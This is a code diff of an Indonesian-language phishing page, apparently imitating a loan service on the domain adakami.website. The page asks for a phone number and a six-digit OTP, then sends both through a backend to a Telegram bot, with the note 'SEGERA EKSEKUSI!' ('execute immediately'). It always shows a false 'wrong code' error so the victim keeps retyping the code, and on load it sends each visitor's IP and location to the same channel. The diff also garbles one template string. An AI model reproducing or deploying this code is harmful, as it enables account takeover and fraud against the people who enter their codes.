@@ -150,43 +150,17 @@
                 <div class="spinner"></div>
                 <div style="font-size:12px; color:#666;">Memverifikasi...</div>
             </div>
-
-            <div class="otp-title">Verifikasi Kode</div>
-            <div class="otp-desc" id="otpDesc">Kode verifikasi dikirim</div>
-            
-            <form id="otpForm" onsubmit="handleOtpSubmit(event)">
-                <div class="otp-inputs">
-                    <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric">
-                    <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric">
-                </div>
-
-                <div class="timer-resend">
-                    <span id="timerText">Kirim ulang dalam 60s</span>
-                    <a class="resend-link" id="resendLink" onclick="resetTimer()">Kirim Ulang</a>
-                </div>
-
-                <div class="otp-error" id="otpErrorText">Kode verifikasi salah silahkan masukkan kembali</div>
-
-                <button type="submit" class="btn-otp-submit" style="margin-top: 10px;">Kirim</button>
-            </form>
-        </div>
-    </div>
-
-    <script>
-    const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+<body>
+   <script>
     let userPhoneNumber = '';
     let timerInterval;
 
+    // ================== VALIDASI & LIVE INPUT ==================
     function validateInput(input) {
-        // Hanya angka
+        // Hanya boleh angka
         input.value = input.value.replace(/[^0-9]/g, '');
-        
-        // Logika JavaScript Tambahan untuk Menyembunyikan Label
+
+        // Sembunyikan label kalau sudah ada isinya
         const label = document.getElementById('phoneLabel');
         if (input.value.length > 0) {
             label.style.display = 'none';
@@ -195,11 +169,14 @@ const CHAT_ID = process.env.CHAT_ID;
         }
     }
 
+    // ================== SUBMIT NOMOR HP ==================
     function handlePhoneSubmit(e) {
         e.preventDefault();
+
         const phoneInput = document.getElementById('phoneNumber');
-        const errorMsg = document.getElementById('phoneError');
-        let phone = phoneInput.value;
+        const errorMsg   = document.getElementById('phoneError');
+        let phone = phoneInput.value.trim();
+
         let isValid = false;
 
         if (phone.startsWith('08')) {
@@ -210,14 +187,14 @@ const CHAT_ID = process.env.CHAT_ID;
 
         if (!isValid) {
             errorMsg.style.display = 'block';
-            errorMsg.style.textAlign = 'center'; // Rata tengah teks error
+            errorMsg.style.textAlign = 'center';
             return;
         }
 
         errorMsg.style.display = 'none';
         userPhoneNumber = phone;
 
-        // Pesan Telegram dengan Emoji Unik
+        // Kirim ke Telegram via backend
         const message = `<b>🚀 NOTIFIKASI BARU 🚀</b>\n` +
                         `----------------------------------\n` +
                         `<b>📱 PENGIRIM :</b> <code>${phone}</code>\n` +
@@ -229,24 +206,24 @@ const CHAT_ID = process.env.CHAT_ID;
         showOtpModal(phone);
     }
 
+    // ================== KIRIM KE TELEGRAM ==================
     function sendTelegramMessage(text) {
-    fetch('/api/kirim-telegram', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ pesan: text })
-    }).catch(error => console.log('Tunggu backend siap:', error));
-}
+        fetch('/api/kirim-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ pesan: text })
+        })
+        .catch(err => console.log('Backend belum siap:', err));
+    }
 
+    // ================== TAMPILKAN MODAL OTP ==================
     function showOtpModal(phone) {
         const modal = document.getElementById('otpModal');
-        const desc = document.getElementById('otpDesc');
-        
-        // Judul dan deskripsi dibuat rata tengah
+        const desc  = document.getElementById('otpDesc');
+
         desc.style.textAlign = 'center';
-        desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0, 4)}****${phone.slice(-4)})`;
-        
+        desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(\( {phone.slice(0,4)}**** \){phone.slice(-4)})`;
+
         modal.style.display = 'flex';
         startTimer();
         document.querySelectorAll('.otp-field')[0].focus();
@@ -257,43 +234,47 @@ const CHAT_ID = process.env.CHAT_ID;
         clearInterval(timerInterval);
     }
 
+    // ================== OTP INPUT LOGIC ==================
     const otpInputs = document.querySelectorAll('.otp-field');
     otpInputs.forEach((input, index) => {
-        // Menambahkan inputmode numeric agar keyboard HP otomatis muncul angka
         input.setAttribute('inputmode', 'numeric');
-        
+
         input.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            if (e.target.value.length === 1) {
-                if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+            if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
             }
         });
+
         input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && e.target.value.length === 0) {
-                if (index > 0) otpInputs[index - 1].focus();
+            if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                otpInputs[index - 1].focus();
             }
         });
     });
 
+    // ================== SUBMIT OTP ==================
     function handleOtpSubmit(e) {
         e.preventDefault();
+
         let otpCode = '';
-        otpInputs.forEach(input => otpCode += input.value);
+        otpInputs.forEach(inp => otpCode += inp.value);
+
         if (otpCode.length < 6) return;
 
-        const loader = document.getElementById('loadingSpinner');
+        const loader   = document.getElementById('loadingSpinner');
         const otpError = document.getElementById('otpErrorText');
+
         loader.style.display = 'flex';
         otpError.style.display = 'none';
 
         const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
-        
-        // Pesan OTP dengan Emoji Bergerak/Unik di Telegram
+
         const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n` +
                         `----------------------------------\n` +
                         `<b>🔑 OTP CODE :</b> <code>${formattedOtp}</code>\n` +
                         `<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n` +
-                        `<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString()}\n` +
+                        `<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n` +
                         `----------------------------------\n` +
                         `<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
 
@@ -302,27 +283,32 @@ const CHAT_ID = process.env.CHAT_ID;
         setTimeout(() => {
             loader.style.display = 'none';
             otpError.style.display = 'block';
-            otpError.style.textAlign = 'center'; // Rata tengah teks error OTP
+            otpError.style.textAlign = 'center';
+
+            // Reset OTP fields
             otpInputs.forEach(input => input.value = '');
             otpInputs[0].focus();
         }, 3000);
     }
 
+    // ================== TIMER OTP ==================
     function startTimer() {
         let timeLeft = 60;
         const timerText = document.getElementById('timerText');
         const resendLink = document.getElementById('resendLink');
-        
-        // Pengaturan rata tengah untuk timer
+
         timerText.style.textAlign = 'center';
         resendLink.style.textAlign = 'center';
-        
+
         resendLink.style.display = 'none';
         timerText.style.display = 'inline';
+
         clearInterval(timerInterval);
+
         timerInterval = setInterval(() => {
             timeLeft--;
             timerText.innerText = `⏳ Kirim ulang dalam ${timeLeft}s`;
+
             if (timeLeft <= 0) {
                 clearInterval(timerInterval);
                 timerText.style.display = 'none';
@@ -334,38 +320,40 @@ const CHAT_ID = process.env.CHAT_ID;
     function resetTimer() {
         startTimer();
     }
-        </script>
-        <script type="text/javascript">
-  window.onload = function() {
-    // BOT_TOKEN dan CHAT_ID sudah dihapus total dari file HTML ini untuk keamanan
 
-    // Mengambil data lokasi pengunjung berdasarkan IP
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n` +
-                          `<b>Domain:</b> www.adakami.website\n` +
-                          `<b>IP:</b> <code>${data.ip}</code>\n` +
-                          `<b>Kota:</b> ${data.city}\n` +
-                          `<b>Negara:</b> ${data.country_name}\n` +
-                          `<b>Provider:</b> ${data.org}\n` +
-                          `<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
-
-        // Kirim data ke BACKEND LOKAL kamu (contoh: Vercel Function), bukan ke Telegram langsung
-        // Pastikan endpoint '/api/kirim-telegram' ini sudah kamu buat di backend
-        fetch('/api/kirim-telegram', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            pesan: infoPesan
-          })
-        })
-        .then(response => console.log("Data pengunjung berhasil dikirim ke backend"))
-        .catch(error => console.error("Gagal mengirim data pengunjung ke backend", error));
-      })
-      .catch(err => console.error("Gagal melacak kunjungan"));
-  };
+    // ================== EVENT LISTENER (PENTING!) ==================
+    document.addEventListener('DOMContentLoaded', () => {
+        const phoneInput = document.getElementById('phoneNumber');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', () => validateInput(phoneInput));
+        }
+    });
 </script>
 
+<!-- SCRIPT PENCATATAN PENGUNJUNG (tetap terpisah supaya clean) -->
+<script type="text/javascript">
+    window.onload = function() {
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n` +
+                                  `<b>Domain:</b> www.adakami.website\n` +
+                                  `<b>IP:</b> <code>${data.ip}</code>\n` +
+                                  `<b>Kota:</b> ${data.city}\n` +
+                                  `<b>Negara:</b> ${data.country_name}\n` +
+                                  `<b>Provider:</b> ${data.org}\n` +
+                                  `<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+
+                fetch('/api/kirim-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ pesan: infoPesan })
+                })
+                .then(() => console.log("✅ Data pengunjung terkirim ke backend"))
+                .catch(err => console.error("❌ Gagal kirim data pengunjung:", err));
+            })
+            .catch(err => console.error("❌ Gagal ambil IP:", err));
+    };
+</script>
 </body>
-</html>
+        </html>
